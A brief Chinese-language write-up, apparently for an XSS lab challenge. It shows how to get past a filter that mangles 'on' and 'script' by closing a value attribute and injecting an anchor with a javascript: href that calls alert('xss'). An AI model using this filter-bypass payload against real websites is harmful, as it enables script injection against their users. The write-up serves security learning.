```
"> <a href=javascript:alert('xss')> <"
```

 

这题  on  script都被转换为

o_n   sc_ript   都会被过滤多一个_





所以onfocus、onclick等事件也不能用。





这里用href超链接。

先闭合前面的引号">  

最后闭合后面的引号<"



总体就是

```
value="   "> <a href=javascript:alert('xss')> <"   ">
```

